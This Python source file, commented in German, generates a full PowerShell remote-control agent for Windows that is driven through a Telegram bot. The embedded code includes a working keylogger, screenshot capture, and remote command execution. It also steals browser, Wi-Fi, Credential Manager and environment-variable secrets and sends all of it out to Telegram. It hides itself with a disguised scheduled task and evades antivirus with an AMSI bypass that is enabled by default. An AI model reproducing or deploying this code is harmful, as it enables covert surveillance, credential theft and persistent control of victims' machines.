"""
Telegram C2 Agent Generator.

Erzeugt ein PowerShell-Skript das auf dem Ziel-Windows läuft und:
  - Alle N Sekunden Telegram auf neue Befehle prüft (Invoke-RestMethod, builtin)
  - Befehle ausführt und Ergebnisse zurückschickt
  - Screenshots aufnimmt und als Foto sendet
  - Keylogger startet/stoppt
  - Clipboard überwacht
  - Dateien hoch-/runterlädt
  - Sich selbst persistiert (Scheduled Task)

Operator-Seite: normales Telegram — kein extra Tool nötig.
Befehle werden mit ! eingeleitet (z.B. !shell whoami).

Architektur:
  Operator (Telegram App) → Telegram API ← Agent (Windows PS1)
                                          → Ergebnisse zurück →
"""

from __future__ import annotations
import textwrap

# ── Befehlsliste ──────────────────────────────────────────────────────────────
COMMANDS = {
    "!shell <cmd>":      "Shell-Befehl ausführen (cmd.exe)",
    "!ps <cmd>":         "PowerShell-Befehl ausführen",
    "!screenshot":       "Screenshot aufnehmen und senden",
    "!sysinfo":          "Systeminformationen (OS, User, IP, Domäne)",
    "!whoami":           "Aktueller Benutzer + Rechte",
    "!ls <pfad>":        "Verzeichnis auflisten (default: C:\\)",
    "!cat <datei>":      "Dateiinhalt lesen",
    "!download <datei>": "Datei an Telegram senden",
    "!clipboard":        "Zwischenablage lesen",
    "!keylog start":     "Keylogger starten",
    "!keylog stop":      "Keylogger stoppen + Log senden",
    "!keylog dump":      "Aktuellen Keylog senden ohne zu stoppen",
    "!wifi":             "Gespeicherte WLAN-Passwörter auslesen",
    "!browsers":         "Chrome/Firefox/Edge Passwörter via DPAPI dumpen",
    "!creds":            "Windows Credential Manager + LSA Secrets",
    "!privesc":          "Privilege Escalation Checks (UAC, Token, unquoted paths...)",
    "!netstat":          "Aktive Netzwerkverbindungen + lauschende Ports",
    "!portscan <ip>":    "Schneller Port-Scan vom kompromittierten Host",
    "!env":              "Umgebungsvariablen (API Keys, Tokens, Passwörter)",
    "!persist":          "Als Scheduled Task persistieren",
    "!unpersist":        "Scheduled Task entfernen",
    "!exit":             "Agent beenden",
    "!help":             "Befehle auflisten",
}

# ── PowerShell Keylogger (via SetWindowsHookEx, C# Add-Type) ──────────────────
_KEYLOGGER_CS = r"""
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

public class KL {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static IntPtr _hook = IntPtr.Zero;
    private static StringBuilder _buf = new StringBuilder();
    private static string _logPath;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;

    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc cb, IntPtr mod, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("user32.dll")] static extern int GetMessage(out MSG m, IntPtr h, uint min, uint max);
    [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG m);
    [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
    [DllImport("user32.dll")] static extern short GetKeyState(int k);
    [StructLayout(LayoutKind.Sequential)] public struct MSG { public IntPtr hwnd; public uint msg; public IntPtr wParam; public IntPtr lParam; public uint time; public POINT pt; }
    [StructLayout(LayoutKind.Sequential)] public struct POINT { public int x, y; }
    [StructLayout(LayoutKind.Sequential)] public struct KBDLLHOOKSTRUCT { public uint vkCode; public uint scanCode; public uint flags; public uint time; public IntPtr extra; }

    public static void Start(string logPath) {
        _logPath = logPath;
        using (var proc = System.Diagnostics.Process.GetCurrentProcess())
        using (var mod  = proc.MainModule)
            _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(mod.ModuleName), 0);
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) != 0) {
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }
    }

    public static void Stop() { if (_hook != IntPtr.Zero) UnhookWindowsHookEx(_hook); }

    public static string Dump() { return _buf.ToString(); }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            var s = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
            bool caps  = (GetKeyState(0x14) & 0x0001) != 0;
            string key = ((System.Windows.Forms.Keys)s.vkCode).ToString();
            string c   = key.Length == 1 ? (shift ^ caps ? key.ToUpper() : key.ToLower()) : $"[{key}]";
            _buf.Append(c);
            try { File.AppendAllText(_logPath, c); } catch {}
        }
        return CallNextHookEx(_hook, nCode, wParam, lParam);
    }
}
"""

# ── Screenshot helper ─────────────────────────────────────────────────────────
_SCREENSHOT_PS1 = r"""
function Take-Screenshot {
    param([string]$Path)
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $scr  = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp  = New-Object System.Drawing.Bitmap($scr.Width, $scr.Height)
    $gfx  = [System.Drawing.Graphics]::FromImage($bmp)
    $gfx.CopyFromScreen($scr.Location, [System.Drawing.Point]::Empty, $scr.Size)
    $bmp.Save($Path, [System.Drawing.Imaging.ImageFormat]::Png)
    $gfx.Dispose(); $bmp.Dispose()
    return $Path
}
"""

# ── Telegram helpers ──────────────────────────────────────────────────────────
_TG_HELPERS_PS1 = r"""
function TG-Send {
    param([string]$Text)
    $body = @{ chat_id=$TG_CHAT; text=$Text; parse_mode="HTML" } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri "$TG_API/sendMessage" -Method POST `
            -ContentType "application/json" -Body $body -ErrorAction Stop | Out-Null
    } catch {}
}

function TG-SendPhoto {
    param([string]$FilePath, [string]$Caption="")
    try {
        $form = @{ chat_id=$TG_CHAT; caption=$Caption; photo=Get-Item $FilePath }
        Invoke-RestMethod -Uri "$TG_API/sendPhoto" -Method POST -Form $form -ErrorAction Stop | Out-Null
    } catch {}
}

function TG-SendDocument {
    param([string]$FilePath, [string]$Caption="")
    try {
        $form = @{ chat_id=$TG_CHAT; caption=$Caption; document=Get-Item $FilePath }
        Invoke-RestMethod -Uri "$TG_API/sendDocument" -Method POST -Form $form -ErrorAction Stop | Out-Null
    } catch {}
}

function TG-GetUpdates {
    param([int]$Offset=0)
    try {
        $r = Invoke-RestMethod -Uri "$TG_API/getUpdates?offset=$Offset&timeout=5" -ErrorAction Stop
        return $r.result
    } catch { return @() }
}
"""

# ── Befehlsverarbeitung ───────────────────────────────────────────────────────
_CMD_HANDLER_PS1 = r"""
function Handle-Command {
    param([string]$Text, [int]$MsgId)

    if ($Text -eq "!help") {
        $msg = "<b>PenKit C2 Agent</b>`n`n"
        $msg += "!shell &lt;cmd&gt;    — CMD-Befehl`n"
        $msg += "!ps &lt;cmd&gt;       — PowerShell`n"
        $msg += "!screenshot       — Screenshot`n"
        $msg += "!sysinfo          — Systeminfo`n"
        $msg += "!whoami           — User + Rechte`n"
        $msg += "!ls &lt;pfad&gt;       — Verzeichnis`n"
        $msg += "!cat &lt;datei&gt;     — Datei lesen`n"
        $msg += "!download &lt;pfad&gt; — Datei senden`n"
        $msg += "!clipboard        — Zwischenablage`n"
        $msg += "!keylog start/stop/dump`n"
        $msg += "!wifi             — WLAN-Passwörter`n"
        $msg += "!browsers         — Browser-Passwörter (DPAPI)`n"
        $msg += "!creds            — Credential Manager`n"
        $msg += "!privesc          — PrivEsc Checks`n"
        $msg += "!netstat          — Netzwerk-Verbindungen`n"
        $msg += "!portscan &lt;ip&gt;   — Port-Scan`n"
        $msg += "!env              — API-Keys in Umgebung`n"
        $msg += "!persist          — Persistenz`n"
        $msg += "!exit             — Agent beenden"
        TG-Send $msg
        return
    }

    if ($Text -like "!shell *") {
        $cmd = $Text.Substring(7)
        try {
            $out = cmd /c $cmd 2>&1 | Out-String
            TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($out.Trim()))</pre>"
        } catch { TG-Send "[!] Fehler: $_" }
        return
    }

    if ($Text -like "!ps *") {
        $cmd = $Text.Substring(4)
        try {
            $out = Invoke-Expression $cmd 2>&1 | Out-String
            TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($out.Trim()))</pre>"
        } catch { TG-Send "[!] Fehler: $_" }
        return
    }

    if ($Text -eq "!screenshot") {
        $path = "$env:TEMP\ss_$(Get-Date -Format yyyyMMdd_HHmmss).png"
        Take-Screenshot -Path $path
        TG-SendPhoto -FilePath $path -Caption "Screenshot $(Get-Date -Format 'dd.MM.yyyy HH:mm')"
        Remove-Item $path -ErrorAction SilentlyContinue
        return
    }

    if ($Text -eq "!sysinfo") {
        $ip  = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
        $loc = try { (Invoke-RestMethod "https://ipinfo.io/$ip/json" -ErrorAction SilentlyContinue) } catch { $null }
        $msg  = "<b>System Info</b>`n"
        $msg += "Host    : $env:COMPUTERNAME`n"
        $msg += "User    : $env:USERNAME`n"
        $msg += "Domain  : $env:USERDOMAIN`n"
        $msg += "OS      : $((Get-WmiObject Win32_OperatingSystem).Caption)`n"
        $msg += "IP Ext  : $ip`n"
        if ($loc) { $msg += "Location: $($loc.city), $($loc.country)`n" }
        $msg += "IP Int  : $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127.*'} | Select -First 1).IPAddress)`n"
        $msg += "RAM     : $([math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)) GB`n"
        $msg += "AV      : $((Get-MpComputerStatus -ErrorAction SilentlyContinue).AMProductVersion)`n"
        $msg += "Uptime  : $((Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime)"
        TG-Send $msg
        return
    }

    if ($Text -eq "!whoami") {
        $priv = whoami /priv 2>&1 | Select-String "SeDebug|SeTcb|SeImpersonate" | Out-String
        $grp  = whoami /groups 2>&1 | Select-String "Admin|SYSTEM" | Out-String
        TG-Send "<pre>$(whoami)`n$priv`n$grp</pre>"
        return
    }

    if ($Text -like "!ls*") {
        $path = if ($Text.Length -gt 4) { $Text.Substring(4).Trim() } else { "C:\" }
        try {
            $items = Get-ChildItem $path -ErrorAction Stop |
                Select-Object Mode, LastWriteTime, Length, Name |
                Format-Table -AutoSize | Out-String
            TG-Send "<pre>$path`n$($items.Trim())</pre>"
        } catch { TG-Send "[!] $_" }
        return
    }

    if ($Text -like "!cat *") {
        $path = $Text.Substring(5).Trim()
        try {
            $content = Get-Content $path -Raw -ErrorAction Stop
            if ($content.Length -gt 3800) { $content = $content.Substring(0,3800) + "`n[gekürzt...]" }
            TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($content))</pre>"
        } catch { TG-Send "[!] $_" }
        return
    }

    if ($Text -like "!download *") {
        $path = $Text.Substring(10).Trim()
        if (Test-Path $path) {
            TG-SendDocument -FilePath $path -Caption "Download: $path"
        } else { TG-Send "[!] Datei nicht gefunden: $path" }
        return
    }

    if ($Text -eq "!clipboard") {
        Add-Type -AssemblyName System.Windows.Forms
        $clip = [System.Windows.Forms.Clipboard]::GetText()
        if ($clip) { TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($clip))</pre>" }
        else        { TG-Send "[*] Zwischenablage leer." }
        return
    }

    if ($Text -eq "!keylog start") {
        if (-not $script:KLJob) {
            $script:KLLog  = "$env:TEMP\kl_$(Get-Random).tmp"
            $script:KLJob  = Start-Job -ScriptBlock {
                param($cs, $lp)
                Add-Type -TypeDefinition $cs -ReferencedAssemblies System.Windows.Forms
                [KL]::Start($lp)
            } -ArgumentList $KL_CS, $script:KLLog
            TG-Send "[+] Keylogger gestartet. Log: $script:KLLog"
        } else { TG-Send "[*] Keylogger läuft bereits." }
        return
    }

    if ($Text -eq "!keylog stop") {
        if ($script:KLJob) {
            Stop-Job $script:KLJob; Remove-Job $script:KLJob
            $script:KLJob = $null
            if (Test-Path $script:KLLog) {
                TG-SendDocument -FilePath $script:KLLog -Caption "Keylog (final)"
                Remove-Item $script:KLLog -ErrorAction SilentlyContinue
            }
            TG-Send "[*] Keylogger gestoppt."
        } else { TG-Send "[*] Kein Keylogger aktiv." }
        return
    }

    if ($Text -eq "!keylog dump") {
        if (Test-Path $script:KLLog) {
            $log = Get-Content $script:KLLog -Raw
            if ($log.Length -gt 3800) { $log = $log.Substring(0,3800) + "[...]" }
            TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($log))</pre>"
        } else { TG-Send "[*] Kein Keylog vorhanden." }
        return
    }

    if ($Text -eq "!wifi") {
        $profiles = netsh wlan show profiles 2>&1 |
            Select-String "Profil\s*:\s*(.+)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
        $result = "WLAN Passwörter:`n"
        foreach ($p in $profiles) {
            $details = netsh wlan show profile name="$p" key=clear 2>&1 |
                Select-String "Schlüsselinhalt|Key Content" | Out-String
            $pw = if ($details -match ":\s*(.+)$") { $Matches[1].Trim() } else { "(kein Passwort)" }
            $result += "  $p  →  $pw`n"
        }
        TG-Send "<pre>$result</pre>"
        return
    }

    if ($Text -eq "!browsers") {
        # Chrome/Edge DPAPI Password Dump via CryptUnprotectData
        $chromePaths = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\Chromium\User Data\Default\Login Data"
        )
        $result = "Browser Credentials:`n"
        $found = 0

        Add-Type -AssemblyName System.Security
        foreach ($path in $chromePaths) {
            if (-not (Test-Path $path)) { continue }
            $browser = ($path -split "\\")[5]
            # Copy DB (Chrome locks it)
            $tmp = "$env:TEMP\ldb_$found.tmp"
            Copy-Item $path $tmp -Force -ErrorAction SilentlyContinue

            try {
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Version=3;Read Only=True;")
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user=0"
                $reader = $cmd.ExecuteReader()
                while ($reader.Read()) {
                    $url = $reader[0]; $user = $reader[1]
                    $encPw = $reader.GetValue(2)
                    try {
                        $decPw = [System.Text.Encoding]::UTF8.GetString(
                            [System.Security.Cryptography.ProtectedData]::Unprotect(
                                $encPw, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
                    } catch { $decPw = "(encrypted)" }
                    if ($user -or $decPw -ne "(encrypted)") {
                        $result += "[$browser] $url`n  User: $user  |  Pass: $decPw`n"
                        $found++
                    }
                }
                $conn.Close()
            } catch {
                # SQLite3 DLL nicht verfügbar — PowerShell Fallback
                $result += "[$browser] DB gefunden (SQLite DLL benötigt fur Entschlüsselung)`n  Pfad: $path`n"
            }
            Remove-Item $tmp -ErrorAction SilentlyContinue
        }

        # Firefox: logins.json (Base64 + NSS crypto)
        $ffProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
        foreach ($prof in $ffProfiles) {
            $loginFile = Join-Path $prof.FullName "logins.json"
            if (Test-Path $loginFile) {
                $result += "[Firefox] Profil: $($prof.Name)`n  Logins.json: $loginFile`n"
                $found++
            }
        }

        if ($found -eq 0) { $result += "(keine Browser-Credentials gefunden)`n" }
        $result += "`nGesamt: $found Einträge"
        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($result))</pre>"
        return
    }

    if ($Text -eq "!creds") {
        # Windows Credential Manager
        $result = "Windows Credential Manager:`n"
        try {
            $creds = cmdkey /list 2>&1 | Out-String
            $result += $creds
        } catch { $result += "(Zugriff verweigert)`n" }
        # Umgebungsvariablen nach Tokens/Passwörtern
        $result += "`nAPI-Keys/Tokens in Umgebungsvariablen:`n"
        $keywords = @("key","token","secret","password","pass","api","auth","credential")
        foreach ($entry in [System.Environment]::GetEnvironmentVariables().GetEnumerator()) {
            foreach ($kw in $keywords) {
                if ($entry.Key -like "*$kw*" -or $entry.Value -like "*$kw*") {
                    $result += "  $($entry.Key) = $($entry.Value)`n"
                    break
                }
            }
        }
        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($result))</pre>"
        return
    }

    if ($Text -eq "!privesc") {
        $r = "=== Privilege Escalation Checks ===`n`n"
        # UAC Level
        $uac = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
        $r += "[UAC] EnableLUA: $uac (0=disabled=instant privesc)`n"
        $uacLevel = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin
        $r += "[UAC] ConsentPromptBehaviorAdmin: $uacLevel (0=no prompt)`n`n"
        # Aktueller User + Gruppen
        $r += "[USER] $(whoami) | Groups: $((whoami /groups 2>&1 | Select-String 'Mandatory Label') -join ', ')`n`n"
        # AlwaysInstallElevated
        $aie1 = (Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated
        $aie2 = (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated
        if ($aie1 -eq 1 -and $aie2 -eq 1) { $r += "[!!!] AlwaysInstallElevated AKTIV → MSI als SYSTEM ausführen!`n" }
        # Unquoted Service Paths
        $r += "`n[Unquoted Service Paths]`n"
        $svcs = Get-WmiObject win32_service | Where-Object { $_.PathName -notmatch '"' -and $_.PathName -match ' ' } | Select-Object Name,PathName
        if ($svcs) { foreach ($s in $svcs) { $r += "  $($s.Name): $($s.PathName)`n" } }
        else { $r += "  (keine gefunden)`n" }
        # Writeable Directories in PATH
        $r += "`n[Writeable PATH Dirs]`n"
        foreach ($p in ($env:PATH -split ";")) {
            if (Test-Path $p) {
                $acl = (Get-Acl $p -ErrorAction SilentlyContinue).Access |
                    Where-Object { $_.IdentityReference -match "Everyone|Users" -and $_.FileSystemRights -match "Write|FullControl" }
                if ($acl) { $r += "  SCHREIBBAR: $p`n" }
            }
        }
        # PowerShell Version
        $r += "`n[PowerShell] v$($PSVersionTable.PSVersion) | CLR: $($PSVersionTable.CLRVersion)`n"
        # .NET Version
        $r += "[.NET] $(Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version -ErrorAction 0 | Sort-Object Version | Select-Object -Last 1 -ExpandProperty Version)`n"
        # Scheduled Tasks als SYSTEM
        $r += "`n[Scheduled Tasks als SYSTEM (schreibbar)]`n"
        $tasks = schtasks /query /fo LIST 2>&1 | Select-String "TaskName|Run As User" | Out-String
        $r += ($tasks | Select-Object -First 20) + "`n"
        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($r))</pre>"
        return
    }

    if ($Text -eq "!netstat") {
        $ns = netstat -ano 2>&1 | Out-String
        $result = "Aktive Verbindungen:`n$ns"
        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($result))</pre>"
        return
    }

    if ($Text -match "^!portscan (.+)$") {
        $target = $Matches[1].Trim()
        $result = "Port-Scan $target (Top 20 Ports):`n"
        $ports = @(21,22,23,25,53,80,110,135,139,143,443,445,1433,3306,3389,5432,5900,6379,8080,8443)
        foreach ($port in $ports) {
            try {
                $tcp = New-Object System.Net.Sockets.TcpClient
                $conn = $tcp.BeginConnect($target, $port, $null, $null)
                $wait = $conn.AsyncWaitHandle.WaitOne(500, $false)
                if ($wait -and !$tcp.Client.Connected -eq $false) {
                    $result += "  :$port  OPEN`n"
                }
                $tcp.Close()
            } catch {}
        }
        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($result))</pre>"
        return
    }

    if ($Text -eq "!env") {
        $result = "Umgebungsvariablen:`n"
        $keywords = @("key","token","secret","password","pass","api","auth","aws","azure","gcp","db","database","mongo","redis","mysql","postgres","openai","github","gitlab")
        foreach ($entry in [System.Environment]::GetEnvironmentVariables([System.EnvironmentVariableTarget]::Process).GetEnumerator()) {
            foreach ($kw in $keywords) {
                if ($entry.Key.ToLower() -like "*$kw*") {
                    $result += "  $($entry.Key) = $($entry.Value)`n"
                    break
                }
            }
        }
        # Alle anzeigen wenn nichts gefunden
        if ($result -eq "Umgebungsvariablen:`n") {
            $all = [System.Environment]::GetEnvironmentVariables() | Out-String
            $result += $all
        }
        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($result))</pre>"
        return
    }

    if ($Text -eq "!persist") {
        $scriptPath = "$env:APPDATA\Microsoft\Windows\svchost_helper.ps1"
        Copy-Item $PSCommandPath $scriptPath -Force -ErrorAction SilentlyContinue
        $action  = New-ScheduledTaskAction -Execute "powershell" -Argument "-ep bypass -w hidden -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -Hidden
        Register-ScheduledTask -TaskName "WindowsHelperService" -Action $action `
            -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
        TG-Send "[+] Persistiert als Scheduled Task 'WindowsHelperService' (bei Anmeldung)"
        return
    }

    if ($Text -eq "!unpersist") {
        Unregister-ScheduledTask -TaskName "WindowsHelperService" -Confirm:$false -ErrorAction SilentlyContinue
        TG-Send "[*] Scheduled Task entfernt."
        return
    }

    if ($Text -eq "!exit") {
        TG-Send "[*] Agent beendet."
        exit 0
    }
}
"""

# ── Haupt-Loop ────────────────────────────────────────────────────────────────
_MAIN_LOOP_PS1 = r"""
# ── Startup ──
Add-Type -AssemblyName System.Web
$script:KLJob = $null
$script:KLLog = ""
$offset = 0

TG-Send "<b>Agent online</b>`n$env:USERNAME@$env:COMPUTERNAME`n$(Get-Date -Format 'dd.MM.yyyy HH:mm')`nTipp: !help"

# ── Poll loop ──
while ($true) {
    $updates = TG-GetUpdates -Offset $offset
    foreach ($u in $updates) {
        $offset = $u.update_id + 1
        $text = $u.message.text
        if ($text -and $text.StartsWith("!")) {
            Handle-Command -Text $text.Trim() -MsgId $u.message.message_id
        }
    }
    Start-Sleep -Seconds {INTERVAL}
}
"""


def generate(
    token: str,
    chat_id: str,
    interval: int = 10,
    include_amsi_bypass: bool = True,
) -> str:
    """
    Generates the complete Windows PS1 agent.

    Parameters
    ----------
    token    : Telegram Bot Token (from @BotFather)
    chat_id  : Telegram Chat ID (your personal chat with the bot)
    interval : Polling interval in seconds (default 10)
    include_amsi_bypass : Prepend AMSI+ETW bypass (recommended)
    """
    from tools.c2.amsi_bypass import get_inline_bypass

    bypass = get_inline_bypass() if include_amsi_bypass else ""

    # Build header manually — PowerShell here-strings require '@ at column 0,
    # so we cannot use textwrap.dedent on a block containing embedded C# code.
    cs_code = _KEYLOGGER_CS.strip()
    header = (
        f"# PenKit C2 Agent — Telegram\n"
        f'$TG_TOKEN = "{token}"\n'
        f'$TG_CHAT  = "{chat_id}"\n'
        f'$TG_API   = "https://api.telegram.org/bot$TG_TOKEN"\n'
        f"$KL_CS    = @'\n"
        f"{cs_code}\n"
        f"'@"
    )

    main = _MAIN_LOOP_PS1.replace("{INTERVAL}", str(interval))

    parts = []
    if bypass:
        parts.append(bypass)
    parts += [header, _SCREENSHOT_PS1.strip(), _TG_HELPERS_PS1.strip(),
              _CMD_HANDLER_PS1.strip(), main.strip()]

    return "\n\n".join(parts)
